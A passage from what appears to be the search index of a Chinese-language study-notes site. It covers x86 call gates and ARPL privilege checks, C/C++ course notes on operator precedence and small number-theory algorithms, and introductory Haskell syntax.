memset()\uff0c\u800c\u662f\u81ea\u5df1\u505a *p = ... \u7684\u5199\u5165\u4e00\u5b9a\u4f1a\u89e6\u53d1 GPF(General Protect Fault) \u5373\u5728\u8be5\u6307\u4ee4\u524d\u63d2\u5165\u5e76\u8c03\u7528 int 0Dh \u5047\u8bbe\u5728 ring3 \u4e2d\u8c03\u7528 memset(p, 0, 1) p = 0x2800000000\uff08\u5047\u8bbe 0x28 \u8fd9\u4e2a selector \u5bf9\u5e94\u6bb5\u7684 DPL \u662f 0\uff09 push 1 push 0 push 28 h push 0 call far ptr call_gate_to_memset : 0 \u5f53\u8fd9\u6761 call \u53d1\u751f\u65f6\uff0cring3 \u7684\u5806\u6808\u4e2d\u4ec5\u6709 call \u6307\u4ee4\u4e0a\u65b9 push \u7684\u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u4e0b\u6761\u6307\u4ee4\u7684\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u3002CPU \u4f1a\u4ece\u5f53\u524d\u8fdb\u7a0b\u7684 tss\uff08task state segment\uff0c\u901a\u8fc7 ltr \u6307\u4ee4\u8d4b\u503c\uff09\u4e2d\u53d6\u51fa ss0 \u53ca esp0 \u4f5c\u4e3a\u65b0\u7684\u5806\u6808\u6307\u9488\uff08ss = ss0, esp = esp0\uff09\uff0c\u8fdb\u884c\u5806\u6808\u5207\u6362\u3002\u4e4b\u540e\u8fdb\u884c\u7684\u64cd\u4f5c\u6709\uff1a push ring3 \u7684 ss\u3001push ring3 \u7684 esp \u628a ring3 \u4e2d\u7684\u53c2\u6570\u5168\u90e8\u590d\u5236\u5230 ring0 \u5806\u6808\u4e2d push ring3 \u7684 cs\u3001push ring3 \u7684 eip jmp \u76ee\u6807\u51fd\u6570 memset \u51fd\u6570\u4e2d\u4f1a\u53d6\u51fa\u8c03\u7528\u8005\u7684 cs\uff0c\u53d6\u51fa CPL \u4e0e\u53c2\u6570 p \u6bb5\u5730\u5740\u7684 DPL \u8fdb\u884c\u6bd4\u8f83 memset: push ebp mov ebp , esp mov cx , [ ebp + 8 ] ; \u8c03\u7528\u8005 ring3 \u7684 cs mov ax , [ ebp + 10 h ] ; 28h arpl ax , cx ; adjust request privilege level ; \u4f1a\u628a cx \u7684\u4f4e 2 \u4f4d\u590d\u5236\u7ed9 ax \u7684\u4f4e 2 \u4f4d\uff0c\u5373 ax \u53d8\u4e3a 2Bh mov ds , ax ; \u8fd9\u91cc\u4f1a\u89e6\u53d1 GPF ; CPU \u8fdb\u884c\u6743\u9650\u68c0\u67e5\uff0c\u5f53 cs.cpl <= 28h \u6bb5\u7684 DPL ; && ax.rpl <= 28h \u6bb5\u7684 DPL \u65f6\u624d\u80fd\u8d4b\u503c\u6210\u529f\uff08ax.rpl \u5373 ax \u7684\u4f4e 2 \u4f4d\uff09 arpl \u4fdd\u62a4\u6a21\u5f0f \u6307\u4ee4\u683c\u5f0f \uff1aarpl dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08adjust request privilege level\uff09\u5f53 src \u7684\u4f4e 2 \u4f4d\u5927\u4e8e dest \u7684\u4f4e 2 \u4f4d\u65f6\uff0c\u4f1a\u628a src \u7684\u4f4e 2 \u4f4d\u590d\u5236\u7ed9 dest \u7684\u4f4e 2 \u4f4d \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0csrc \u4e3a\u5bc4\u5b58\u5668","title":"call gate"},{"location":"cs/pl/c_cpp/","text":"C/C++ \u00b6 Abstract \u8bb0\u5f55\u4e00\u4e9b\u7b2c\u4e00\u6b21\u89c1\u8fc7\u7684\u7528\u6cd5\u3001\u6709\u7528\u7684\u6587\u7ae0/\u5de5\u5177\uff0c\u4ee5\u53ca\u5bb9\u6613\u5fd8\u7684\u77e5\u8bc6\u70b9 \u6d59\u6c5f\u5927\u5b66 \u201c\u7a0b\u5e8f\u8bbe\u8ba1\u4e0e\u7b97\u6cd5\u57fa\u7840\u201d\uff08\u5927\u4e00\u79cb\u51ac\uff09\u8bfe\u7a0b\u590d\u4e60\u7b14\u8bb0 \u7a0b\u5e8f\u8bbe\u8ba1\u4e0e\u7b97\u6cd5\u57fa\u7840 \u00b6 \u8003\u8bd5\u6613\u9519\u9898 \u00b6 zjj\u5927\u4f6c\u6574\u7406\u7684\u7a0b\u7b97\u6613\u9519\u9898 \u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7 \u00b6 \u4f18\u5148\u7ea7 \u8fd0\u7b97\u7b26 \u7ed3\u5408\u5f8b 1 \u540e\u7f00\u8fd0\u7b97\u7b26\uff1a[] () \u00b7 -> \u4ece\u5de6\u5230\u53f3 2 \u4e00\u5143\u8fd0\u7b97\u7b26\uff1a++ -- ! ~ +\uff08\u6b63\uff09 -\uff08\u8d1f\uff09 * & sizeof \u7c7b\u578b\u8f6c\u6362 \u4ece\u53f3\u5230\u5de6 3 \u4e58\u9664\u6cd5\u8fd0\u7b97\u7b26\uff1a* / % \u4ece\u5de6\u5230\u53f3 4 \u52a0\u51cf\u6cd5\u8fd0\u7b97\u7b26\uff1a+ - \u4ece\u5de6\u5230\u53f3 5 \u79fb\u4f4d\u8fd0\u7b97\u7b26\uff1a<< >> \u4ece\u5de6\u5230\u53f3 6 \u5173\u7cfb\u8fd0\u7b97\u7b26\uff1a< <= > >= \u4ece\u5de6\u5230\u53f3 7 \u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a== != \u4ece\u5de6\u5230\u53f3 8 \u4f4d\u8fd0\u7b97\u7b26 AND\uff1a& \u4ece\u5de6\u5230\u53f3 9 \u4f4d\u8fd0\u7b97\u7b26 XOR\uff1a^ \u4ece\u5de6\u5230\u53f3 10 \u4f4d\u8fd0\u7b97\u7b26 OR\uff1a| \u4ece\u5de6\u5230\u53f3 11 \u903b\u8f91\u8fd0\u7b97\u7b26 AND\uff1a&& \u4ece\u5de6\u5230\u53f3 12 \u903b\u8f91\u8fd0\u7b97\u7b26 OR\uff1a|| \u4ece\u5de6\u5230\u53f3 13 \u6761\u4ef6\u8fd0\u7b97\u7b26\uff1a?: \u4ece\u53f3\u5230\u5de6 14 \u8d4b\u503c\u8fd0\u7b97\u7b26\uff1a= += -= *= /= %= &= ^= |= <<= >>= \u4ece\u53f3\u5230\u5de6 15 \u9017\u53f7\u8fd0\u7b97\u7b26\uff1a\uff0c \u4ece\u5de6\u5230\u53f3 \u6613\u5fd8\u7b97\u6cd5 \u00b6 gcd int gcd ( int a , int b ) { return b == 0 ? a : gcd ( b , a % b ); } exgcd void exgcd ( int a , int b , int * d , int * x , int * y ) { if ( ! b ) { * d = a ; * x = 1 ; * y = 0 ; } else { exgcd ( b , a % b , d , y , x ); * y -= * x * ( a / b ); } } \u5feb\u901f\u5e42 int pow_mod ( int a , int p , int n ){ long long res = 1 ; while ( p ) { if ( p & 1 ) res = 1L L * res * a % n ; a = 1L L * a * a % n ; p >>= 1 ; } return ( int ) res ; } \u8f93\u51fa\u7c7b\u578b \u00b6 \u522b\u7684\u8bed\u8a00\uff08\u6bd4\u5982 Python\u3001Haskell\uff09\u5f88\u591a\u90fd\u53ef\u4ee5\u901a\u8fc7\u5185\u7f6e\u7684\u65b9\u6cd5\u8f7b\u677e\u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u4f46\u662f C/C++ \u7684\u8bdd\u4ece\u6765\u6ca1\u4e86\u89e3\u8fc7\uff08C \u5230\u76ee\u524d\u4e5f\u6ca1\u4e86\u89e3\u8fc7\u5185\u7f6e\u7684\u6709\u8fd9\u79cd\u529f\u80fd\u7684\u5e93\uff09 \u67e5\u5230\u4e86 C++ \u53ef\u4ee5\u4f7f\u7528 typeid(...).name() \u7684\u65b9\u6cd5\uff08\u5728\u5934\u6587\u4ef6 <typeinfo> \u4e2d\uff09\u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u4f46\u662f\u7ed3\u679c\u6bd4\u8f83\u62bd\u8c61 C++ \u8fd8\u53ef\u4ee5\u4f7f\u7528\u5934\u6587\u4ef6 <cxxabi.h> \u8fd9\u4e2a\u5e93\u91cc\u63d0\u4f9b\u7684 abi::__cxa_demangle \u51fd\u6570\u6765\u5f97\u5230\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982\uff1a #include <stdio.h> #include <cxxabi.h> #include <typeinfo> int main () { int * ( * p )[ 10 ]; char * str = abi :: __cxa_demangle ( typeid ( p ). name (), NULL , NULL , NULL ); printf ( \"%s \\n \" , str ); // \u5f97\u5230 int* (*) [10] return 0 ; } \u53c8\u641c\u7d22\u5230\u4e86 https://cdecl.org/ \u8fd9\u4e2a\u7f51\u7ad9\u3002\u5f3a\u7684\u5f88\uff0c\u76f4\u63a5\u8f93\u5165\u7c7b\u578b\u58f0\u660e\u5c31\u53ef\u4ee5\u8f6c\u6362\u5f97\u5230\u82f1\u6587\u63cf\u8ff0\uff0c\u4e5f\u53ef\u4ee5\u7ed9\u82f1\u6587\u63cf\u8ff0\u8f6c\u6362\u6210\u7c7b\u578b\u58f0\u660e \u6e90\u7801\uff1a ridiculousfish/cdecl-blocks","title":"C/C++"},{"location":"cs/pl/c_cpp/#cc","text":"Abstract \u8bb0\u5f55\u4e00\u4e9b\u7b2c\u4e00\u6b21\u89c1\u8fc7\u7684\u7528\u6cd5\u3001\u6709\u7528\u7684\u6587\u7ae0/\u5de5\u5177\uff0c\u4ee5\u53ca\u5bb9\u6613\u5fd8\u7684\u77e5\u8bc6\u70b9 \u6d59\u6c5f\u5927\u5b66 \u201c\u7a0b\u5e8f\u8bbe\u8ba1\u4e0e\u7b97\u6cd5\u57fa\u7840\u201d\uff08\u5927\u4e00\u79cb\u51ac\uff09\u8bfe\u7a0b\u590d\u4e60\u7b14\u8bb0","title":"C/C++"},{"location":"cs/pl/c_cpp/#_1","text":"","title":"\u7a0b\u5e8f\u8bbe\u8ba1\u4e0e\u7b97\u6cd5\u57fa\u7840"},{"location":"cs/pl/c_cpp/#_2","text":"zjj\u5927\u4f6c\u6574\u7406\u7684\u7a0b\u7b97\u6613\u9519\u9898","title":"\u8003\u8bd5\u6613\u9519\u9898"},{"location":"cs/pl/c_cpp/#_3","text":"\u4f18\u5148\u7ea7 \u8fd0\u7b97\u7b26 \u7ed3\u5408\u5f8b 1 \u540e\u7f00\u8fd0\u7b97\u7b26\uff1a[] () \u00b7 -> \u4ece\u5de6\u5230\u53f3 2 \u4e00\u5143\u8fd0\u7b97\u7b26\uff1a++ -- ! ~ +\uff08\u6b63\uff09 -\uff08\u8d1f\uff09 * & sizeof \u7c7b\u578b\u8f6c\u6362 \u4ece\u53f3\u5230\u5de6 3 \u4e58\u9664\u6cd5\u8fd0\u7b97\u7b26\uff1a* / % \u4ece\u5de6\u5230\u53f3 4 \u52a0\u51cf\u6cd5\u8fd0\u7b97\u7b26\uff1a+ - \u4ece\u5de6\u5230\u53f3 5 \u79fb\u4f4d\u8fd0\u7b97\u7b26\uff1a<< >> \u4ece\u5de6\u5230\u53f3 6 \u5173\u7cfb\u8fd0\u7b97\u7b26\uff1a< <= > >= \u4ece\u5de6\u5230\u53f3 7 \u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a== != \u4ece\u5de6\u5230\u53f3 8 \u4f4d\u8fd0\u7b97\u7b26 AND\uff1a& \u4ece\u5de6\u5230\u53f3 9 \u4f4d\u8fd0\u7b97\u7b26 XOR\uff1a^ \u4ece\u5de6\u5230\u53f3 10 \u4f4d\u8fd0\u7b97\u7b26 OR\uff1a| \u4ece\u5de6\u5230\u53f3 11 \u903b\u8f91\u8fd0\u7b97\u7b26 AND\uff1a&& \u4ece\u5de6\u5230\u53f3 12 \u903b\u8f91\u8fd0\u7b97\u7b26 OR\uff1a|| \u4ece\u5de6\u5230\u53f3 13 \u6761\u4ef6\u8fd0\u7b97\u7b26\uff1a?: \u4ece\u53f3\u5230\u5de6 14 \u8d4b\u503c\u8fd0\u7b97\u7b26\uff1a= += -= *= /= %= &= ^= |= <<= >>= \u4ece\u53f3\u5230\u5de6 15 \u9017\u53f7\u8fd0\u7b97\u7b26\uff1a\uff0c \u4ece\u5de6\u5230\u53f3","title":"\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7"},{"location":"cs/pl/c_cpp/#_4","text":"gcd int gcd ( int a , int b ) { return b == 0 ? a : gcd ( b , a % b ); } exgcd void exgcd ( int a , int b , int * d , int * x , int * y ) { if ( ! b ) { * d = a ; * x = 1 ; * y = 0 ; } else { exgcd ( b , a % b , d , y , x ); * y -= * x * ( a / b ); } } \u5feb\u901f\u5e42 int pow_mod ( int a , int p , int n ){ long long res = 1 ; while ( p ) { if ( p & 1 ) res = 1L L * res * a % n ; a = 1L L * a * a % n ; p >>= 1 ; } return ( int ) res ; }","title":"\u6613\u5fd8\u7b97\u6cd5"},{"location":"cs/pl/c_cpp/#_5","text":"\u522b\u7684\u8bed\u8a00\uff08\u6bd4\u5982 Python\u3001Haskell\uff09\u5f88\u591a\u90fd\u53ef\u4ee5\u901a\u8fc7\u5185\u7f6e\u7684\u65b9\u6cd5\u8f7b\u677e\u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u4f46\u662f C/C++ \u7684\u8bdd\u4ece\u6765\u6ca1\u4e86\u89e3\u8fc7\uff08C \u5230\u76ee\u524d\u4e5f\u6ca1\u4e86\u89e3\u8fc7\u5185\u7f6e\u7684\u6709\u8fd9\u79cd\u529f\u80fd\u7684\u5e93\uff09 \u67e5\u5230\u4e86 C++ \u53ef\u4ee5\u4f7f\u7528 typeid(...).name() \u7684\u65b9\u6cd5\uff08\u5728\u5934\u6587\u4ef6 <typeinfo> \u4e2d\uff09\u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u4f46\u662f\u7ed3\u679c\u6bd4\u8f83\u62bd\u8c61 C++ \u8fd8\u53ef\u4ee5\u4f7f\u7528\u5934\u6587\u4ef6 <cxxabi.h> \u8fd9\u4e2a\u5e93\u91cc\u63d0\u4f9b\u7684 abi::__cxa_demangle \u51fd\u6570\u6765\u5f97\u5230\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982\uff1a #include <stdio.h> #include <cxxabi.h> #include <typeinfo> int main () { int * ( * p )[ 10 ]; char * str = abi :: __cxa_demangle ( typeid ( p ). name (), NULL , NULL , NULL ); printf ( \"%s \\n \" , str ); // \u5f97\u5230 int* (*) [10] return 0 ; } \u53c8\u641c\u7d22\u5230\u4e86 https://cdecl.org/ \u8fd9\u4e2a\u7f51\u7ad9\u3002\u5f3a\u7684\u5f88\uff0c\u76f4\u63a5\u8f93\u5165\u7c7b\u578b\u58f0\u660e\u5c31\u53ef\u4ee5\u8f6c\u6362\u5f97\u5230\u82f1\u6587\u63cf\u8ff0\uff0c\u4e5f\u53ef\u4ee5\u7ed9\u82f1\u6587\u63cf\u8ff0\u8f6c\u6362\u6210\u7c7b\u578b\u58f0\u660e \u6e90\u7801\uff1a ridiculousfish/cdecl-blocks","title":"\u8f93\u51fa\u7c7b\u578b"},{"location":"cs/pl/haskell/","text":"Haskell \u662f\u4e00\u79cd\u6807\u51c6\u5316\u7684\uff0c\u901a\u7528\u7684\u7eaf\u51fd\u6570\u5f0f\u7f16\u7a0b\u8bed\u8a00\uff0c\u6709\u60f0\u6027\u6c42\u503c\u548c\u5f3a\u9759\u6001\u7c7b\u578b\u3002\u5b83\u7684\u547d\u540d\u6e90\u81ea\u7f8e\u56fd\u903b\u8f91\u5b66\u5bb6\u54c8\u65af\u51ef\u5c14\u00b7\u52a0\u91cc\uff0c\u4ed6\u5728\u6570\u7406\u903b\u8f91\u65b9\u9762\u4e0a\u7684\u5de5\u4f5c\u4f7f\u5f97\u51fd\u6570\u5f0f\u7f16\u7a0b\u8bed\u8a00\u6709\u4e86\u5e7f\u6cdb\u7684\u57fa\u7840\u3002\u5728 Haskell \u4e2d\uff0c\u201c\u51fd\u6570\u662f\u7b2c\u4e00\u7c7b\u5bf9\u8c61\u201d\u3002\u4f5c\u4e3a\u4e00\u95e8\u51fd\u6570\u7f16\u7a0b\u8bed\u8a00\uff0c\u4e3b\u8981\u63a7\u5236\u7ed3\u6784\u662f\u51fd\u6570\u3002Haskell \u8bed\u8a00\u662f1990\u5e74\u5728\u7f16\u7a0b\u8bed\u8a00 Miranda \u7684\u57fa\u7840\u4e0a\u6807\u51c6\u5316\u7684\uff0c\u5e76\u4e14\u4ee5\u03bb\u6f14\u7b97\u4e3a\u57fa\u7840\u53d1\u5c55\u800c\u6765\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48 Haskell \u8bed\u8a00\u4ee5\u5e0c\u814a\u5b57\u6bcd \u201c\u03bb\u201d\uff08Lambda\uff09\u4f5c\u4e3a\u81ea\u5df1\u7684\u6807\u5fd7\u3002Haskell \u5177\u6709\u201c\u8bc1\u660e\u5373\u7a0b\u5e8f\u3001\u547d\u9898\u4e3a\u7c7b\u578b\u201d\u7684\u7279\u5f81\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 \u57fa\u7840\u8fd0\u7b97 \u00b6 + - * / () \uff1a\u52a0\u51cf\u4e58\u9664 div \uff1a\u6574\u9664 mod \uff1a\u53d6\u6a21 True False \uff1a\u5e03\u5c14\u503c || && not \uff1a\u6216\u4e14\u975e == \uff1a\u6761\u4ef6\u5224\u65ad\uff0c\u76f8\u7b49 /= \uff1a\u6761\u4ef6\u5224\u65ad\uff0c\u4e0d\u7b49 \u51fd\u6570\u8c03\u7528 \u00b6 Haskell \u4e2d\u8c03\u7528\u51fd\u6570\u4e0d\u52a0\u62ec\u53f7\uff0c\u5148\u5199\u51fa\u51fd\u6570\u540d\uff0c\u7136\u540e\u9010\u4e2a\u5217\u51fa\u53c2\u6570\uff0c\u7528\u7a7a\u683c\u9694\u5f00\uff1a ghci > max 1 2 2 \u524d\u7f00\uff08prefix\uff09\u51fd\u6570\u4e0e\u4e2d\u7f00\uff08infix\uff09\u51fd\u6570\u8f6c\u6362\uff1a \u5bf9\u524d\u7f00\u51fd\u6570\u52a0 `` \u4f7f\u5176\u53d8\u6210\u4e2d\u7f00\u51fd\u6570 \u5bf9\u4e2d\u7f00\u51fd\u6570\u52a0 () \u4f7f\u5176\u53d8\u6210\u524d\u7f00\u51fd\u6570 ghci > 4 ` div ` 2 2 ghci > 1 ` max ` 2 2 ghci > ( + ) 1 2 3 ghci > ( || ) True False True List \u00b6 \u5217\u8868\u662f Haskell \u4e2d\u5f88\u5e38\u89c1\u7684\u6570\u636e\u7c7b\u578b\uff0c\u548c Python \u4e2d\u4e0d\u540c\uff0cHaskell \u4e2d\u7684\u5217\u8868\u4e2d\u7684\u6240\u6709\u5143\u7d20\u5fc5\u987b\u662f\u540c\u4e00\u4e2a\u7c7b\u578b\u3002 \u4ee5\u4e0b\u662f\u5217\u8868\u5e38\u7528\u7684\u51fd\u6570\uff1a (++) :: [a] -> [a] -> [a]\uff1a\u5408\u5e76\u4e24\u4e2a\u5217\u8868 (:) :: a -> [a] -> [a]\uff1a\u5c06\u5355\u4e2a\u5143\u7d20\u5e76\u5165\u5217\u8868\u3002[1, 2, 3] \u662f 1:2:3:[] \u7684\u8bed\u6cd5\u7cd6 (!!) :: [a] -> Int -> a\uff1a\u901a\u8fc7\u7d22\u5f15\u53d6\u51fa\u67d0\u4e2a\u4f4d\u7f6e\u4e0a\u7684\u5143\u7d20\u3002a !! 1 \u76f8\u5f53\u4e8e Python \u4e2d\u7684 a[1] head :: [a] -> a\uff1a\u8fd4\u56de\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 tail :: [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u9664\u53bb\u7b2c\u4e00\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868\uff08\u82e5\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u5219\u8fd4\u56de\u7a7a\u5217\u8868[]\uff09 last :: [a] -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20 init :: [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u9664\u53bb\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868 length :: Foldable t => t a -> Int\uff1a\u8fd4\u56de\u5217\u8868\u7684\u957f\u5ea6 null :: Foldable t => t a -> Bool\uff1a\u8fd4\u56de\u5217\u8868\u662f\u5426\u4e3a\u7a7a reverse :: [a] -> [a]\uff1a\u8fd4\u56de\u7ffb\u8f6c\u540e\u7684\u5217\u8868 take :: Int -> [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868a\u7684\u524dn\u4e2a\u5143\u7d20\u7684\u5217\u8868(take n a) drop :: Int -> [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868a\u4e2d\u9664\u53bb\u524dn\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868(drop n a) maximum :: (Foldable t, Ord a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c minimum :: (Foldable t, Ord a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c sum :: (Foldable t, Num a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u6240\u6709\u5143\u7d20\u7684\u548c product :: (Foldable t, Num a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u6240\u6709\u5143\u7d20\u7684\u79ef elem :: (Foldable t, Eq a) => t a -> Bool\uff1a\u5224\u65ad\u503cn\u662f\u5426\u5728\u5217\u8868a\u4e2d elem n a -- \u6216 n ` elem ` a --\u7528``\u5305\u4e0a\u53ef\u4ee5\u53d8\u6210\u4e2d\u7f00\u51fd\u6570\u4f7f\u7528 Texas ranges \u00b6 \u4f7f\u7528 .. \u53ef\u4ee5\u8868\u793a\u51fa\u8303\u56f4\u5e76\u81ea\u52a8\u63a8\u5bfc\uff1a ghci > [ 1 .. 10 ] [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] ghci > [ 'a' .. 'z' ] \"abcdefghijklmnopqrstuvwxyz\" ghci > [ 'K' .. 'Z' ] \"KLMNOPQRSTUVWXYZ\" ghci > [ 2 , 4 .. 20 ] [ 2 , 4 , 6 , 8 , 10 , 12 , 14 , 16 , 18 , 20 ] ghci > [ 3 , 6 .. 20 ] [ 3 , 6 , 9 , 12 , 15 , 18 ] ghci > [ 5 , 4 .. 1 ] [ 5 , 4 , 3 , 2 , 1 ] \u4e5f\u53ef\u4ee5\u7528\u6765\u751f\u6210\u65e0\u7a77\u5217\u8868\uff0c\u5982 [1..]\u3001[1, 3..]\u3002\u540c\u65f6\u4e5f\u6709\u51fd\u6570\u53ef\u4ee5\u751f\u6210\u65e0\u7a77\u5217\u8868\uff1a cycle :: [a] -> [a]\uff1a\u5c06\u539f\u5217\u8868\u4e0d\u65ad\u5faa\u73af\u751f\u6210\u65e0\u7a77\u5217\u8868 repeat :: a -> [a]\uff1a\u5c06\u4f20\u5165\u7684\u503c\u4e0d\u65ad\u91cd\u590d\u751f\u6210\u65e0\u7a77\u5217\u8868 replicate :: Int -> a -> [a]\uff1a\u5c06\u503ca\u91cd\u590dn\u6b21\uff0c\u8fd4\u56de\u751f\u6210\u7684\u5217\u8868(replicate n a) List comprehension \u00b6 Haskell \u4e2d\u4e5f\u6709\u5217\u8868\u63a8\u5bfc\uff0c\u5f62\u5f0f\u662f\u4e00\u4e2a\u4e2d\u62ec\u53f7\uff0c\u5de6\u4fa7\u4e3a\u8868\u8fbe\u5f0f\uff0c\u53f3\u4fa7\u4e3a\u53d8\u91cf\u7684\u8303\u56f4\u548c\u7ea6\u675f\u6761\u4ef6 ghci > [ x * 2 | x <- [ 1 .. 10 ]] [ 2 , 4 , 6 , 8 , 10 , 12 , 14 , 16 , 18 , 20 ] ghci > [ x * 2 | x <- [ 1 .. 10 ], x * 2 >= 12 ] [ 12 , 14 , 16 , 18 , 20 ] ghci > [ x | x <- [ 50 .. 100 ], x ` mod ` 7 == 3 ] [ 52 , 59 , 66 , 73 , 80 , 87 , 94 ] ghci > [ x * y | x <- [ 2 , 5 , 10 ], y <- [ 8 , 10 , 11 ]] [ 16 , 20 , 22 , 40 , 50 , 55 , 80 , 100 , 110 ] Tuple \u00b6 Haskell\u4e2d\u7684\u5143\u7ec4\u53ef\u4ee5\u6709\u4e0d\u540c\u957f\u5ea6\uff0c\u5143\u7d20\u53ef\u4ee5\u6709\u4e0d\u540c\u7c7b\u578b\u3002\u5e76\u4e14\u4e00\u4e2a\u5143\u7ec4\u7684\u7c7b\u578b\u7531\u5176\u4e2d\u6240\u6709\u5143\u7d20\u7684\u7c7b\u578b\u5171\u540c\u51b3\u5b9a\u3002\u5b83\u7684\u5e38\u7528\u51fd\u6570\uff1a fst :: (a, b) -> a\uff1a\u8fd4\u56de\u542b\u6709\u4e24\u4e2a\u5143\u7d20\u5143\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 snd :: (a, b) -> b\uff1a\u8fd4\u56de\u542b\u6709\u4e24\u4e2a\u5143\u7d20\u5143\u7ec4\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20 zip :: [a] -> [b] -> [(a, b)]\uff1a\u63a5\u6536\u4e24\u4e2a\u5217\u8868\uff0c\u8fd4\u56de\u4e00\u4e2a\u5217\u8868\uff0c\u6bcf\u4e2a\u5143\u7d20\u662f\u4f9d\u6b21\u5c06\u4e24\u4e2a\u5217\u8868\u4e2d\u5143\u7d20\u914d\u5bf9\u6210\u7684\u4e8c\u5143\u7ec4 Syntax in Functions \u00b6 \u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4e49\uff1a plus x y = x + y \u8fd9\u65f6Haskell\u4f1a\u81ea\u52a8\u63a8\u65ad\u51fd\u6570\u7684\u7c7b\u578b\u4e3a(Num a) => a -> a -> a\u3002\u4f46\u662f\u6700\u597d\u5728\u5b9a\u4e49\u51fd\u6570\u524d\u58f0\u660e\u51fd\u6570\u7684\u7c7b\u578b\uff1a plus :: ( Num a ) => a -> a -> a plus x y = x + y Pattern matching \u00b6 \u5b9a\u4e49\u51fd\u6570\u65f6\u53ef\u4ee5\u4f7f\u7528\u6a21\u5f0f\u5339\u914d\u8bed\u6cd5\u3002\u8fd0\u884c\u65f6\u4f9d\u6b21\u5c06\u8f93\u5165\u4e0e\u7ed9\u51fa\u7684\u6a21\u5f0f\u76f8\u5339\u914d\uff0c\u5982\u679c\u5339\u914d\uff0c\u5c31\u6267\u884c\u5bf9\u5e94\u64cd\u4f5c\uff1b\u4e0d\u5339\u914d\uff0c\u5c31\u7ee7\u7eed\u4e0e\u4e0b\u4e00\u4e2a\u6a21\u5f0f\u76f8\u5339\u914d\uff0c\u76f4\u5230\u5339\u914d\u6210\u529f\uff0c\u4e5f\u56e0\u6b64\uff0c\u6700\u540e\u5fc5\u987b\u8981\u7ed9\u51fa\u4e00\u79cd\u901a\u7528\u7684\u5339\u914d\u6765\u63a5\u6536\u4e0e\u7ed9\u51fa\u6a21\u5f0f\u5168\u4e0d\u5339\u914d\u7684\u8f93\u5165\u3002\u5982\uff1a factorial :: ( Integral a ) => a -> a factorial 0 = 1 factorial n = n * factorial ( n - 1 ) first :: ( a , b , c ) -> a first ( x , _ , _ ) = x second :: ( a , b , c ) -> b second ( _ , y , _ ) = y third :: ( a , b , c ) -> c third ( _ , _ , z ) = z \u5176\u4e2d _ \u8868\u793a\u4efb\u4f55\u503c\uff0c\u4e14\u4e0d\u5173\u5fc3\u5b83\u7684\u5185\u5bb9\uff0c\u53ea\u662f\u7528\u6765\u5360\u4f4d \u5217\u8868\u7684 (:) \u64cd\u4f5c\u4e5f\u53ef\u4ee5\u7528\u6765\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\uff1a head' :: [ a ] -> a head' [] = error \"Can't call head on an empty list, dummy!\" head' ( x : _ ) = x sum' :: ( Num a ) => [ a ] -> a sum' [] = 0 sum' ( x : xs ) = x + sum' xs \u4f46 (++) \u64cd\u4f5c\u4e0d\u53ef\u4ee5\u7528\u6765\u6a21\u5f0f\u5339\u914d \u5728\u9488\u5bf9\u5217\u8868\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\u65f6\uff0c\u5982\u679c\u540c\u65f6\u9700\u8981\u6574\u4e2a\u5217\u8868\u3001\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u503c\u3001\u5217\u8868\u9664\u7b2c\u4e00\u4e2a\u503c\u5916\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 xs@(q:qs) \u3002\u6bd4\u5982 [1, 2, 3] \u901a\u8fc7 xs@(q:qs) \u5339\u914d\u540e\uff0cxs \u4e3a [1, 2, 3]\uff0cq \u4e3a 1\uff0cqs \u4e3a [2, 3] Guard syntax \u00b6 \u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5b88\u536b\uff08guard\uff09\u8bed\u6cd5\uff1a max' :: ( Ord a ) => a -> a -> a max' a b | a > b = a | otherwise = b \u5148\u7ed9\u51fa\u4f20\u5165\u7684\u53c2\u6570\u53d8\u91cf\uff0c\u7136\u540e\u4e0b\u4e00\u884c\u7f29\u8fdb\u540e\u52a0 |\uff0c| 